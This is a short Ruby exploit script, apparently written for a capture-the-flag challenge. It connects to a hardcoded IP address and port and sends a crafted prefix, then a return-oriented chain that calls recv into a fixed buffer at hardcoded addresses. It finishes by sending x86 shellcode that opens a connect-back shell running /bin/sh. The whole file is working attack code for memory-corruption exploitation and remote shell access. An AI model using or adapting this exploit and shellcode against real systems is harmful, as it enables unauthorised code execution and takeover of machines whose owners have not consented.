require 'socket'

class FunnyBusinessExploit
	def initialize(ip, port)
		@s = TCPSocket.new(ip, port)
	end

	def send_data data
		p data, data.length
		@s.print([data.length].pack('<I'))
		@s.print(data)
	end

	def pause
		STDIN.readline
	end

	def send data
		@s.print data
	end
end

exploit = FunnyBusinessExploit.new '5.9.0.122', 49681
exploit.pause

prefix = "\x78\x9c\x4b\x64\x00\x00\x00\xc4\x00\x62" + "AAA"
shellcode = "\x6a\x66\x58\x99\x89\xd3\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc3\x89\xd1\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x52\x52\x68\x7f\x00\x00\x01\x66\xb9\x11\x5c\xc1\xe1\x10\xb1\x02\x51\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb3\x03\xb0\x66\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80"

# recv buffer with size -> jump to buffer
buffer = 0x0804B0A0
recv_plt = 0x080487B0
pppr = 0x08048BBE

payload = [recv_plt, buffer, 0x4, buffer, shellcode.length, 0]
exploit.send_data prefix + payload.pack('<I*')
exploit.send shellcode
